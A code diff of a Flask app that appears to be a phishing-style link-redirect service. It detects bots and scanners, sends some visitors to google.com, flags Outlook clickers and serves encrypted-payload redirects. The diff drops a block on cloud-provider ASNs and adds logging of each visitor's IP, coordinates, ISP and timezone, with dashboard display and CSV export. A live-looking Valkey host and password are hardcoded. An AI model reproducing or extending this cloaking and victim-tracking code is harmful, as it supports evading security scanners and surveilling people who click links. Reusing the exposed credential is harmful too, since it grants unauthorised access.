@@ -41,7 +41,6 @@ VALKEY_HOST = os.getenv("VALKEY_HOST", "valkey-137d99b9-reign.e.aivencloud.com")
 VALKEY_PORT = int(os.getenv("VALKEY_PORT", 25708))
 VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "default")
 VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "AVNS_Yzfa75IOznjCrZJIyzI")
-MAXMIND_KEY = os.getenv("MAXMIND_KEY", "")
 USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
 DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
 
@@ -104,7 +103,6 @@ def is_bot(user_agent, headers, ip, endpoint):
         if 'username' in session:
             logger.debug(f"IP {ip} is authenticated, skipping bot check")
             return False, "Authenticated user"
-        # Skip JS verification for generated link routes
         if endpoint.startswith("/") and endpoint != "/login":
             logger.debug(f"IP {ip} allowed for generated link {endpoint}, skipping JS verification")
             return False, "Generated link access"
@@ -146,34 +144,32 @@ def is_bot(user_agent, headers, ip, endpoint):
 
 def check_asn(ip):
     try:
-        if not MAXMIND_KEY:
-            logger.debug("MAXMIND_KEY not set, skipping ASN check")
-            return False
-        response = requests.get(f"https://api.maxmind.com/v2.0/asn/{ip}?apiKey={MAXMIND_KEY}")
-        response.raise_for_status()
-        asn = response.json().get('asn', 0)
-        blocked_asns = [16509, 14618, 8075, 14061, 16276]
-        result = asn in blocked_asns
-        logger.debug(f"ASN check for IP {ip}: ASN {asn}, Blocked: {result}")
-        return result
+        logger.debug("Skipping ASN check (no MaxMind key)")
+        return False
     except Exception as e:
-        logger.error(f"MaxMind ASN check failed for IP {ip}: {str(e)}", exc_info=True)
+        logger.error(f"ASN check failed for IP {ip}: {str(e)}", exc_info=True)
         return False
 
 def get_geoip(ip):
     try:
-        if not MAXMIND_KEY:
-            return {"country": "Unknown", "city": "Unknown"}
-        response = requests.get(f"https://geoip.maxmind.com/geoip/v2.0/city/{ip}?apiKey={MAXMIND_KEY}")
+        response = requests.get(f"https://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
         response.raise_for_status()
         data = response.json()
+        if data.get('status') != 'success':
+            logger.error(f"IP-API.com error for IP {ip}: {data.get('message', 'Unknown error')}")
+            return {"country": "Unknown", "city": "Unknown", "region": "Unknown", "lat": 0.0, "lon": 0.0, "isp": "Unknown", "timezone": "Unknown"}
         return {
-            "country": data.get('country', {}).get('names', {}).get('en', 'Unknown'),
-            "city": data.get('city', {}).get('names', {}).get('en', 'Unknown')
+            "country": data.get('country', 'Unknown'),
+            "city": data.get('city', 'Unknown'),
+            "region": data.get('regionName', 'Unknown'),
+            "lat": data.get('lat', 0.0),
+            "lon": data.get('lon', 0.0),
+            "isp": data.get('isp', 'Unknown'),
+            "timezone": data.get('timezone', 'Unknown')
         }
     except Exception as e:
-        logger.error(f"MaxMind GeoIP failed for IP {ip}: {str(e)}", exc_info=True)
-        return {"country": "Unknown", "city": "Unknown"}
+        logger.error(f"IP-API.com failed for IP {ip}: {str(e)}", exc_info=True)
+        return {"country": "Unknown", "city": "Unknown", "region": "Unknown", "lat": 0.0, "lon": 0.0, "isp": "Unknown", "timezone": "Unknown"}
 
 def rate_limit(limit=5, per=60):
     def decorator(f):
@@ -408,6 +404,64 @@ def block_ohio_subdomain():
             return redirect("https://google.com", code=302)
     except Exception as e:
         logger.error(f"Error in block_ohio_subdomain: {str(e)}", exc_info=True)
+
+@app.before_request
+def log_visitor():
+    try:
+        if request.path.startswith(('/static', '/challenge', '/fingerprint', '/denied')):
+            return
+        username = session.get('username', 'default')
+        user_agent = request.headers.get("User-Agent", "")
+        ip = request.remote_addr
+        headers = request.headers
+        referer = headers.get("Referer", "")
+        session_start = session.get('session_start', int(time.time()))
+        session['session_start'] = session_start
+        ua = parse(user_agent)
+        device = "Desktop"
+        if ua.is_mobile:
+            device = "Android" if "Android" in user_agent else "iPhone" if "iPhone" in user_agent else "Mobile"
+        app = "Unknown"
+        if "Outlook" in user_agent:
+            app = "Outlook"
+        elif ua.browser.family:
+            app = ua.browser.family
+        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
+        visit_type = "Human"
+        if is_bot_flag:
+            visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
+        elif app != "Unknown" and app != ua.browser.family:
+            visit_type = "App"
+        location = get_geoip(ip)
+        session_duration = int(time.time()) - session_start
+        if valkey_client:
+            try:
+                visitor_id = hashlib.sha256(f"{ip}{time.time()}".encode()).hexdigest()
+                valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
+                    "timestamp": int(time.time()),
+                    "ip": ip,
+                    "country": location['country'],
+                    "city": location['city'],
+                    "region": location['region'],
+                    "lat": str(location['lat']),
+                    "lon": str(location['lon']),
+                    "isp": location['isp'],
+                    "timezone": location['timezone'],
+                    "device": device,
+                    "application": app,
+                    "user_agent": user_agent,
+                    "bot_status": visit_type,
+                    "block_reason": bot_reason if is_bot_flag else "N/A",
+                    "referer": referer,
+                    "source": 'referral' if referer else 'direct',
+                    "session_duration": session_duration
+                })
+                valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
+                logger.debug(f"Logged visitor: {visitor_id} for user: {username}")
+            except Exception as e:
+                logger.error(f"Valkey error logging visitor: {str(e)}", exc_info=True)
+    except Exception as e:
+        logger.error(f"Error in log_visitor: {str(e)}", exc_info=True)
 
 @app.route("/login", methods=["GET", "POST"])
 @rate_limit(limit=5, per=60)
@@ -762,6 +816,7 @@ def dashboard():
             try:
                 logger.debug(f"Fetching visitor keys for user: {username}")
                 visitor_keys = valkey_client.keys(f"user:{username}:visitor:*")
+                logger.debug(f"Found {len(visitor_keys)} visitor keys")
                 for key in visitor_keys:
                     try:
                         visitor_data = valkey_client.hgetall(key)
@@ -773,7 +828,12 @@ def dashboard():
                             "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'Unknown',
                             "ip": visitor_data.get('ip', 'Unknown'),
                             "country": visitor_data.get('country', 'Unknown'),
+                            "region": visitor_data.get('region', 'Unknown'),
                             "city": visitor_data.get('city', 'Unknown'),
+                            "lat": float(visitor_data.get('lat', 0.0)),
+                            "lon": float(visitor_data.get('lon', 0.0)),
+                            "isp": visitor_data.get('isp', 'Unknown'),
+                            "timezone": visitor_data.get('timezone', 'Unknown'),
                             "device": visitor_data.get('device', 'Unknown'),
                             "application": visitor_data.get('application', 'Unknown'),
                             "user_agent": visitor_data.get('user_agent', 'Unknown'),
@@ -990,7 +1050,8 @@ def dashboard():
                                                             <th>Device</th>
                                                             <th>App</th>
                                                             <th>Type</th>
-                                                            <th>Location</th>
+                                                            <th>Country</th>
+                                                            <th>City</th>
                                                         </tr>
                                                     </thead>
                                                     <tbody>
@@ -1001,7 +1062,8 @@ def dashboard():
                                                                 <td>{{ visit.device }}</td>
                                                                 <td>{{ visit.app }}</td>
                                                                 <td>{{ visit.type }}</td>
-                                                                <td>{{ visit.location.country }}, {{ visit.location.city }}</td>
+                                                                <td>{{ visit.location.country }}</td>
+                                                                <td>{{ visit.location.city }}</td>
                                                             </tr>
                                                         {% endfor %}
                                                     </tbody>
@@ -1029,7 +1091,12 @@ def dashboard():
                                                 <th>Timestamp</th>
                                                 <th>IP</th>
                                                 <th>Country</th>
+                                                <th>Region</th>
                                                 <th>City</th>
+                                                <th>Lat</th>
+                                                <th>Lon</th>
+                                                <th>ISP</th>
+                                                <th>Timezone</th>
                                                 <th>Device</th>
                                                 <th>Application</th>
                                                 <th>User Agent</th>
@@ -1045,7 +1112,12 @@ def dashboard():
                                                     <td>{{ visitor.timestamp }}</td>
                                                     <td>{{ visitor.ip }}</td>
                                                     <td>{{ visitor.country }}</td>
+                                                    <td>{{ visitor.region }}</td>
                                                     <td>{{ visitor.city }}</td>
+                                                    <td>{{ visitor.lat }}</td>
+                                                    <td>{{ visitor.lon }}</td>
+                                                    <td>{{ visitor.isp }}</td>
+                                                    <td>{{ visitor.timezone }}</td>
                                                     <td>{{ visitor.device }}</td>
                                                     <td>{{ visitor.application }}</td>
                                                     <td>{{ visitor.user_agent }}</td>
@@ -1190,13 +1262,18 @@ def export_visitors():
                         logger.error(f"Error processing visitor key {key}: {str(e)}")
                 output = StringIO()
                 writer = csv.writer(output)
-                writer.writerow(['Timestamp', 'IP', 'Country', 'City', 'Device', 'Application', 'User Agent', 'Bot Status', 'Block Reason', 'Source', 'Session Duration (s)'])
+                writer.writerow(['Timestamp', 'IP', 'Country', 'Region', 'City', 'Lat', 'Lon', 'ISP', 'Timezone', 'Device', 'Application', 'User Agent', 'Bot Status', 'Block Reason', 'Source', 'Session Duration (s)'])
                 for visitor in visitor_data:
                     writer.writerow([
                         datetime.fromtimestamp(int(visitor.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor.get('timestamp') else 'Unknown',
                         visitor.get('ip', 'Unknown'),
                         visitor.get('country', 'Unknown'),
+                        visitor.get('region', 'Unknown'),
                         visitor.get('city', 'Unknown'),
+                        visitor.get('lat', '0.0'),
+                        visitor.get('lon', '0.0'),
+                        visitor.get('isp', 'Unknown'),
+                        visitor.get('timezone', 'Unknown'),
                         visitor.get('device', 'Unknown'),
                         visitor.get('application', 'Unknown'),
                         visitor.get('user_agent', 'Unknown'),
@@ -1447,6 +1524,11 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                     "ip": ip,
                     "country": location['country'],
                     "city": location['city'],
+                    "region": location['region'],
+                    "lat": str(location['lat']),
+                    "lon": str(location['lon']),
+                    "isp": location['isp'],
+                    "timezone": location['timezone'],
                     "device": device,
                     "application": app,
                     "user_agent": user_agent,
